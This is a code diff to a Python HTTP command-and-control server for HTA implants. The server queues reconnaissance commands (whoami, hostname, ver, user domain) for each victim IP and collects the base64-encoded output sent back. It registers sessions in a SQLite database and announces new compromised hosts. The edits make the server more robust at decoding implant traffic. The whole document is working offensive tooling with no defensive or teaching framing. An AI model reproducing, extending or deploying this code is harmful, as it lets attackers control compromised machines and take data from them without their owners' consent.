@@ -124,23 +124,25 @@ def pop_notifications():
             msgs.append(notifications.pop(0))
     return msgs
 
-
 class HTAHandler(BaseHTTPRequestHandler):
     def do_GET(self):
         client_ip = self.client_address[0]
         path = self.path
+
         raw = ""
         if path.startswith("/?arg="):
             raw = path[6:]
-        # Ensure client state exists
+            raw = unquote(raw)           # handle %-encoding
+            raw = raw.replace("_", "+")  # HTA may replace + with _
+        # ensure client state exists
         with seen_clients_lock:
             state = seen_clients.get(client_ip)
             if state is None:
                 seen_clients[client_ip] = {
                     "bulk": "",
-                    "queue": [],          # queued commands to send to client
-                    "last_cmd": None,     # last sent command
-                    "collected": {},      # collected outputs
+                    "queue": [],
+                    "last_cmd": None,
+                    "collected": {},
                     "created_at": None,
                     "session_id": None
                 }
@@ -148,7 +150,6 @@ class HTAHandler(BaseHTTPRequestHandler):
 
         if raw == "":
             with seen_clients_lock:
-                # first contact or poll without payload: initialize queue if empty
                 if not state["queue"]:
                     state["queue"] = ["whoami", "hostname", "ver", "echo %USERDOMAIN%"]
                     state["created_at"] = datetime.datetime.now(datetime.timezone.utc).isoformat()
@@ -164,7 +165,7 @@ class HTAHandler(BaseHTTPRequestHandler):
                     pass
             return
 
-        # there is some payload -> accumulate
+        # accumulate and wait for '*' terminator
         with seen_clients_lock:
             state["bulk"] += raw
             if "*" in raw:
@@ -174,15 +175,16 @@ class HTAHandler(BaseHTTPRequestHandler):
                 if pads != 0:
                     full += "=" * (4 - pads)
                 try:
-                    decoded = base64.b64decode(full)
-                    output = decoded.decode("utf-8", errors="ignore")
+                    b = base64.b64decode(full)
+                    decoded = b.decode("utf-8", errors="ignore")
                 except Exception:
-                    output = ""
+                    decoded = ""
+                # sanitize NULs and control garbage
+                decoded = decoded.replace("\x00", "").strip()
                 state["bulk"] = ""
                 last = state.get("last_cmd")
                 if last:
-                    state["collected"][last] = output.strip()
-                # if queue has more commands, send next
+                    state["collected"][last] = decoded
                 if state["queue"]:
                     next_cmd = state["queue"].pop(0)
                     state["last_cmd"] = next_cmd
@@ -194,7 +196,6 @@ class HTAHandler(BaseHTTPRequestHandler):
                     except BrokenPipeError:
                         pass
                     return
-                # finalize session if not created
                 if not state.get("session_id"):
                     username = state["collected"].get("whoami", "").strip()
                     if "\\" in username:
@@ -212,7 +213,6 @@ class HTAHandler(BaseHTTPRequestHandler):
                     with sessions_lock:
                         while sid in sessions:
                             sid = gen_id()
-                        # check DB for duplicates by username+hostname+src_ip
                         conn = sqlite3.connect(DB_PATH)
                         c = conn.cursor()
                         c.execute('SELECT session_id FROM sessions WHERE username = ? AND hostname = ? AND src_ip = ?', (username_only, hostname, client_ip))
@@ -233,7 +233,6 @@ class HTAHandler(BaseHTTPRequestHandler):
                         }
                         state["session_id"] = sid
                     push_notification(f"[+] New session from {hostname}/{username_only} connected (ID: {sid})", session_id=sid)
-                # reply empty
                 self.send_response(200)
                 self.send_header('Content-type', 'text/html')
                 self.end_headers()
